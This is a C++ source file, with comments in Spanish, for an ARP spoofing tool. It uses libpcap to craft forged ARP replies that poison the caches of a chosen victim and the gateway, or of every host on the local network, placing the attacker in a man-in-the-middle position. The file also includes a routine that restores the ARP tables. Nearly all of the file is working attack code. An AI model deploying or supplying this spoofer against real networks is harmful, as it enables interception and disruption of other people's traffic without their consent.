#include "arp_spoofer.h"
#include "gateway_utils.h"
#include <iostream>
#include <csignal>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>

// Declaraciones externas (no definición)
extern ARPSpoofer* globalSpoofer;
extern std::string global_iface;

bool running = true;

void signal_handler(int signo) {
    if (signo == SIGINT) {
        std::cout << "\n[!] Ctrl+C detectado. Restaurando red y saliendo...\n";
        if (globalSpoofer) globalSpoofer->restore_network();
        restore_host_network(global_iface);
        running = false;
        exit(0);
    }
}

// Envío ARP
void send_arp(const std::string& iface, const std::string& src_ip, const std::string& src_mac,
              const std::string& dst_ip, const std::string& dst_mac, bool is_reply = true) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface.c_str(), BUFSIZ, 0, 1000, errbuf);
    if (!handle) {
        std::cerr << "Error en pcap_open_live: " << errbuf << std::endl;
        return;
    }

    uint8_t packet[42] = {0};

    uint8_t src_mac_bytes[6], dst_mac_bytes[6];
    sscanf(src_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &src_mac_bytes[0], &src_mac_bytes[1], &src_mac_bytes[2],
           &src_mac_bytes[3], &src_mac_bytes[4], &src_mac_bytes[5]);
    sscanf(dst_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &dst_mac_bytes[0], &dst_mac_bytes[1], &dst_mac_bytes[2],
           &dst_mac_bytes[3], &dst_mac_bytes[4], &dst_mac_bytes[5]);

    in_addr src_ip_bytes, dst_ip_bytes;
    inet_pton(AF_INET, src_ip.c_str(), &src_ip_bytes);
    inet_pton(AF_INET, dst_ip.c_str(), &dst_ip_bytes);

    memcpy(packet, dst_mac_bytes, 6);
    memcpy(packet + 6, src_mac_bytes, 6);
    packet[12] = 0x08;
    packet[13] = 0x06;

    packet[14] = 0x00; packet[15] = 0x01;
    packet[16] = 0x08; packet[17] = 0x00;
    packet[18] = 0x06; packet[19] = 0x04;
    packet[20] = 0x00; packet[21] = is_reply ? 0x02 : 0x01;

    memcpy(packet + 22, src_mac_bytes, 6);
    memcpy(packet + 28, &src_ip_bytes, 4);
    memcpy(packet + 32, dst_mac_bytes, 6);
    memcpy(packet + 38, &dst_ip_bytes, 4);

    pcap_sendpacket(handle, packet, sizeof(packet));
    pcap_close(handle);
}

// Constructor
ARPSpoofer::ARPSpoofer(const std::string& iface, const std::string& ip, const std::string& mac)
    : interface(iface), my_ip(ip), my_mac(mac) {}

// Spoof a una víctima
void ARPSpoofer::spoof_single(const Device& victim, const Device& gateway) {
    last_victim = victim;
    last_gateway = gateway;

    std::cout << "[*] Spoofing iniciado entre " << victim.ip << " y " << gateway.ip << std::endl;

    while (running) {
        send_arp(interface, gateway.ip, my_mac, victim.ip, victim.mac);
        send_arp(interface, victim.ip, my_mac, gateway.ip, gateway.mac);
        sleep(2);
    }
}

// Spoof a todos
void ARPSpoofer::spoof_all(const std::vector<Device>& devices, const Device& gateway) {
    last_gateway = gateway;

    std::cout << "[*] Spoofing global iniciado...\n";
    while (running) {
        for (const auto& dev : devices) {
            if (dev.ip != gateway.ip && dev.ip != my_ip) {
                last_victim = dev;
                send_arp(interface, gateway.ip, my_mac, dev.ip, dev.mac);
            }
        }
        sleep(2);
    }
}

// Restauración de ARP
void ARPSpoofer::restore_network() {
    if (last_victim.ip.empty() || last_gateway.ip.empty()) return;

    std::cout << "[*] Restaurando ARP entre " << last_victim.ip << " y " << last_gateway.ip << std::endl;

    send_arp(interface, last_gateway.ip, last_gateway.mac, last_victim.ip, last_victim.mac);
    send_arp(interface, last_victim.ip, last_victim.mac, last_gateway.ip, last_gateway.mac);

    std::cout << "[+] Tablas ARP restauradas.\n";
}